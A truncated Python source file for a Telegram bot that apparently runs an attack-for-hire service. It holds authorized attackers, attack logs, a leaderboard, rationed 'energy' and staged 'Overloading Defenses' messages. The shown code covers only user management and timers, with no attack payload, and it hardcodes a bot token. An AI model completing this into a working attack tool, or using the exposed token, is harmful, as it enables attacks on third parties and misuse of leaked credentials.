import telebot
import time
import random
import threading
import subprocess
from datetime import datetime, timedelta

TOKEN = "8118494734:AAFdKTSTuZpbYQTGMW4ltt7NRvFv4gFcQQA"  # Replace with your bot token
ADMIN_ID = 2057365092  # Your admin ID
bot = telebot.TeleBot(TOKEN)

users_energy = {}  # Stores user energy
authorized_users = set()  # Users allowed to use attack commands
attack_logs = []  # Stores attack history
leaderboard = {}  # Tracks total attacks per user
user_last_activity = {}  # Tracks last activity time of users

# Set timeout limit in seconds (e.g., 10 minutes of inactivity)
IDLE_TIMEOUT = 600  # 600 seconds = 10 minutes

# Energy Regeneration (adds +1 energy every 3 hours)
def energy_regen():
    while True:
        time.sleep(10800)  # 3 hours in seconds
        for user in users_energy:
            users_energy[user] += 1
bot_thread = threading.Thread(target=energy_regen)
bot_thread.start()

# Idle Timeout Check (removes inactive users from authorized_users)
def idle_timeout_check():
    while True:
        time.sleep(60)  # Check every minute
        current_time = datetime.now()
        to_remove = []
        for user_id, last_activity in user_last_activity.items():
            if (current_time - last_activity).total_seconds() > IDLE_TIMEOUT:
                to_remove.append(user_id)

        # Remove inactive users from authorized users
        for user_id in to_remove:
            authorized_users.discard(user_id)
            bot.send_message(user_id, "⚠️ You have been logged out due to inactivity.")
            user_last_activity.pop(user_id, None)  # Remove from last activity tracker
        time.sleep(60)

bot_thread_timeout = threading.Thread(target=idle_timeout_check)
bot_thread_timeout.start()

# Attack Phases
attack_phases = [
    "🛠 Initializing Attack...",
    "🚀 Engaging Target...",
    "⚡ Overloading Defenses...",
    "💥 Final Strike Incoming!",
    "✅ Mission Accomplished!"
]

# Command to give access to a user
@bot.message_handler(commands=["add"])
def add_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /add <user_id>")
        return
    user_id = int(args[1])
    authorized_users.add(user_id)
    bot.reply_to(message, f"✅ User {user_id} has been authorized!")

# Command to remove access
@bot.message_handler(commands=["remove"])
def remove_user(message):
    if message.from_user.id !=
